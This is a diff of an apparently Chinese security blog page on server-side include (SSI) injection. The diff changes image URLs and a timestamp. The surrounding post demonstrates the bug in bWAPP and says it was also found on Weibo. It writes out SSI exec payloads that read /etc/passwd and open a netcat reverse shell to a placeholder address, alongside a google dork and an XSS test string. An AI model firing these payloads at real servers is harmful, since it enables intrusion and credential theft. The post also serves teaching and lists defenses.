@@ -120,16 +120,16 @@
 <meta property="og:site_name" content="瓦都剋">
 <meta property="og:description" content="前段时间刚好在一篇文章中看到了一个SSI的文章，现在这种业务基本上很少见了，之前也没了解过(原谅我是菜鸡—_-!)没留意过。运气好，刚好在微博上给遇到了，所以记录下学习过程。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssi-0.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssi-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssi-2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/ssi-0.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/ssi-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/ssi-2.png">
 <meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssi-3.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssi-4.jpg">
-<meta property="og:updated_time" content="2018-01-05T04:53:38.000Z">
+<meta property="og:image" content="http://blog.w2n1ck.com/ssi-4.jpg">
+<meta property="og:updated_time" content="2018-12-14T05:52:51.129Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSI-服务器端包含注入">
 <meta name="twitter:description" content="前段时间刚好在一篇文章中看到了一个SSI的文章，现在这种业务基本上很少见了，之前也没了解过(原谅我是菜鸡—_-!)没留意过。运气好，刚好在微博上给遇到了，所以记录下学习过程。">
-<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/ssi-0.png">
+<meta name="twitter:image" content="http://blog.w2n1ck.com/ssi-0.png">
 
 
 
@@ -488,12 +488,12 @@
 <li>识别页面是否包含.stm,.shtm和.shtml后缀</li>
 </ul>
 <p>google dork：<code>inurl:bin/cklb</code></p>
-<h1 id="0x05-SSI漏洞复现"><a href="#0x05-SSI漏洞复现" class="headerlink" title="0x05 SSI漏洞复现"></a>0x05 SSI漏洞复现</h1><h2 id="5-1-本地测试"><a href="#5-1-本地测试" class="headerlink" title="5.1 本地测试"></a>5.1 本地测试</h2><p>我们使用bWAPP来做漏洞演示环境<br>选择：<code>Server-Side Includes (SSI) Injection</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-0.png" alt=""><br>输入个XSS的payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-1.png" alt=""><br>成功执行了代码。</p>
-<p>再使用下exec指令使用cmd作为参数执行服务器端命令：<code>&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-2.png" alt=""></p>
+<h1 id="0x05-SSI漏洞复现"><a href="#0x05-SSI漏洞复现" class="headerlink" title="0x05 SSI漏洞复现"></a>0x05 SSI漏洞复现</h1><h2 id="5-1-本地测试"><a href="#5-1-本地测试" class="headerlink" title="5.1 本地测试"></a>5.1 本地测试</h2><p>我们使用bWAPP来做漏洞演示环境<br>选择：<code>Server-Side Includes (SSI) Injection</code><br><img src="http://blog.w2n1ck.com/ssi-0.png" alt=""><br>输入个XSS的payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="http://blog.w2n1ck.com/ssi-1.png" alt=""><br>成功执行了代码。</p>
+<p>再使用下exec指令使用cmd作为参数执行服务器端命令：<code>&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;</code><br><img src="http://blog.w2n1ck.com/ssi-2.png" alt=""></p>
 <h2 id="5-2-漏洞挖掘"><a href="#5-2-漏洞挖掘" class="headerlink" title="5.2 漏洞挖掘"></a>5.2 漏洞挖掘</h2><p>运气好，刚好遇到个微博的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</div></pre></td></tr></table></figure></p>
 <p><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-3.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-4.jpg" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/ssi-4.jpg" alt=""></p>
 <h1 id="0x06-SSI防御"><a href="#0x06-SSI防御" class="headerlink" title="0x06 SSI防御"></a>0x06 SSI防御</h1><ul>
 <li>关闭服务器SSI功能</li>
 <li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li>
